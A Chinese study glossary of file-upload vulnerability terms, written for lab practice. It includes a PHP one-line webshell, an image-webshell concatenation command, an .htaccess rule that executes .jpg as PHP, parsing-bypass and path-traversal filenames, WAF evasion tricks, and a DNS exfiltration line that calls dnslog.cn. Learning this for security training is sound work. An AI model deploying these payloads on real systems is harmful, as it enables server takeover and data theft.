# 文件上传资料·名词扫盲表

> **看不懂名词，不等于学不会——很多词只是个名字，机制懂了词自然就懂了。**

---

## 一级：今晚必须懂（8 个）

### 1. multipart（多部分）

**人话：** HTTP 上传文件时用的一种"打包方式"。

一个普通表单只能发一段文本；要同时发"用户名 + 头像文件"，就得把多个部分打包在一起，这就叫 multipart。

**出现在：** 第 0 章第 1 行那个 `Content-Type: multipart/form-data`。

---

### 2. boundary（分隔边界）

**人话：** 打包用的"胶带"，每段数据之间用一根相同的胶带隔开。

因为数据里可能啥字符都有，得选一个在数据里绝对不出现的字符串当分隔符，浏览器随手生成一串随机的。

```
------WebKitFormBoundary7MA4YWxkTrZu0gW   ← 这就是那根胶带
```

**为什么重要：** 它也是客户端生成的，你改它服务器也认，只要前后一致。

---

### 3. Content-Disposition（内容处置）

**人话：** 告诉服务器"这一段是什么"的一行说明。

```
Content-Disposition: form-data; name="file"; filename="test.jpg"
                              ↑ 这是个表单字段  ↑ 字段名   ↑ 文件名
```

**为什么重要：** `filename` 就在这里。**这是整份资料最关键的一个点**——文件名是客户端写的，服务器如果直接拿它去存盘，就等于听攻击者的。

---

### 4. 后缀（extension）

**人话：** 文件名最后那个点后面的部分，`.jpg`、`.php`。

**为什么重要：** 服务器靠它决定"这个文件交给谁来处理"。`.php` 交给 PHP 解释器，`.jpg` 当静态文件直接发出去。

**绕过的一切，本质都是让「服务器认的后缀」和「你实际传的内容」不一致。**

---

### 5. 白名单 / 黑名单

**人话：**

黑名单 = "不许这些"（列一堆禁止的）
白名单 = "只许这些"（列一堆允许的）

**为什么白名单更安全：** 黑名单永远列不全——你知道 `.php` 危险，但 `.php5`、`.phtml`、`.phar` 呢？而白名单是"只放这几个进来"，其余全拒。

**但白名单也能绕：** 因为你改不了后缀了，就改"服务器怎么解释这个后缀"——这就是 `.htaccess` 和解析漏洞。

---

### 6. magic bytes（魔数 / 文件头）

**人话：** 文件开头那几个字节，相当于文件的"身份证号"。

| 格式 | 开头几个字节 |
|---|---|
| GIF | `GIF89a` 或 `GIF87a`（就是字面这几个字符） |
| JPEG | `FF D8 FF` |
| PNG | `89 50 4E 47` |

**为什么存在：** 后缀可以随便改，但文件真实内容改不了。所以严谨的检测会读文件头，不看后缀。

**怎么绕：** 文件开头塞 `GIF89a`，后面接 php 代码。检测看到 GIF89a 就放行，服务器执行时 PHP 解释器会把 `GIF89a` 当普通文本输出，不影响后面的代码。

---

### 7. .htaccess

**人话：** Apache 的一个配置文件，放在某个目录下，就能改这个目录的行为。

内容可以就一行：

```apache
AddType application/x-httpd-php .jpg
```

意思是"这个目录下的 `.jpg` 文件，交给 PHP 处理"。

**为什么致命：** 你传不上去 `.php`（白名单拦着），但传个 `.htaccess` 上去，等于改写了服务器规则，之后你传的任何 `.jpg` 都能执行。

**前提：** Apache + 允许 Override + 允许上传这个文件名。

---

### 8. 解析漏洞

**人话：** 服务器对"这个文件该不该执行"的判断出错了。

三种常见：

**Apache 多后缀** —— `shell.php.jpg`，Apache 按点切开看每一段，发现有 `.php` 就交给 PHP。白名单只看最后一段 `.jpg` 就放行了。

**Nginx 畸形解析** —— `/upload/shell.jpg/x.php`，Nginx 找不到 `x.php` 就把请求转给 PHP，PHP 往前找真实存在的文件，找到 `shell.jpg` 执行了。根因是两个组件对"哪个是脚本"理解不一致。

**IIS 分号** —— `shell.asp;.jpg`，IIS6 把分号当参数分隔，实际执行 `shell.asp`。

**一句话记：** 服务器对文件名的解析，和你想的不一样。

## 二级：见过就行（12 个）

### 9. Content-Type（媒体类型）

`image/jpeg`、`text/html`、`application/json` 这种。

请求里有**两个** Content-Type：一个在请求头（说整个请求是什么格式），一个在每个数据段里（说这一段是什么类型）。

**段内那个是客户端写的，完全不可信。**

---

### 10. form-data

multipart 里每一段开头的固定词，表示"这是表单数据"。

---

### 11. 图像马

**人话：** 一张能正常打开的图片，尾部藏了一段 php 代码。

做法：`cat 1.jpg shell.php > shell.jpg`

检测看文件头是 JPEG，放行；执行时 PHP 把前面那一大段图片数据当普通文本输出，最后执行你藏的那段代码。

---

### 12. 二次渲染

**人话：** 服务器收到图片后，用图像库重新编码一遍再存。

后果：你藏在文件尾部的代码被丢掉了，图像马失效。

**这是目前最有效的防护之一。** 绕过思路是找"重新编码后仍然保留的数据区"（EXIF、tEXt、注释块）。

---

### 13. EXIF / tEXt / 注释块

**人话：** 图片里专门存"说明文字"的区域。

相机拍的照片里存着拍摄时间、GPS、机型，就存在 EXIF 里。

**为什么它是绕过点：** 二次渲染会保留这些元数据区域，所以可以把 payload 藏进去。

---

### 14. 竞争条件

**人话：** 利用"上传成功"和"被删除/被检查"之间那零点几秒的窗口。

经典场景：程序先存文件、后做检查，检查不过就删。你在删之前抢先访问它。

---

### 15. 路径穿越

**人话：** 文件名里写 `../../`，让服务器把文件存到你本不该写的地方。

比如 `filename="../../var/www/html/shell.php"`。

---

### 16. webshell / 一句话木马

**人话：** 传上去的那段代码，能让你远程执行命令。最短的就一行：

```php
<?php system($_GET['c']); ?>
```

访问 `shell.php?c=whoami` 就执行了 `whoami`。

---

### 17. 反弹 shell（reverse shell）

**人话：** 让目标机器主动连回你的机器，把命令行交给你。

为什么叫"反弹"：因为目标在内网，你连不进去，只能让它连出来。

---

### 18. WAF

**人话：** Web 应用防火墙，站在网站前面的规则引擎，专门拦攻击请求。

你实验室 8088 端口那个 ModSecurity 就是 WAF。

---

### 19. 对象存储

**人话：** 阿里云 OSS、亚马逊 S3 这种专门存文件的服务。

**为什么安全：** 文件存在 `oss.xxx.com`，主站是 `www.xxx.com`，不同源。就算你传了 HTML 上去，也偷不到主站的 cookie。

---

### 20. payload

**人话：** 载荷，真正要执行的那部分内容。

打靶时你传的文件里那段 php，就是 payload。

---

## 三级：以后再管（10 个）

### 21. JFIF

JPEG 文件里的一个标识段，就是 `FF D8 FF E0` 后面那串。不用管。

### 22. IDAT

PNG 图片里存像素数据的块名。绕过时会关心"payload 能不能放在它前后"。

### 23. mod_php / PHP-FPM

PHP 和 Web 服务器结合的两种方式。Apache 用 mod_php，Nginx 用 PHP-FPM。**不同组合，解析漏洞不同。**

### 24. AddHandler / AddType

Apache 配置指令，用来"把某种后缀绑到某个处理器"。多后缀解析就是它引起的。

### 25. cgi.fix_pathinfo

PHP 的一个配置项。设成 1 时，Nginx 畸形解析才成立。

### 26. 短标签

PHP 的 `<?=` 和 `<?`，比 `<?php` 短。有些 WAF 规则只查 `<?php`。

### 27. chunked（分块传输）

把请求体切成多块发。有些 WAF 不重组分块，就看不到完整内容。

### 28. DNS 外带

无回显时，用 DNS 查询把数据带出来：`nslookup $(whoami).dnslog.cn`。

### 29. 时间盲

无回显时，靠响应延迟判断：`if(条件, sleep(5), 0)`。

### 30. CDN 缓存投毒

把恶意内容传上 CDN，让缓存返回给别人。进阶话题，先放着。

## 一句实话

看不懂名词的时候，最蠢的做法是去背名词。

正确的做法是：**先搞清它解决什么问题，名字自然就记住了。**

比如 `boundary`——你不用背这个词，你只需要知道"多个部分打包时要有一根分隔线，这根线的字符串也是你写的"，那你就永远不会在它上面栽跟头。
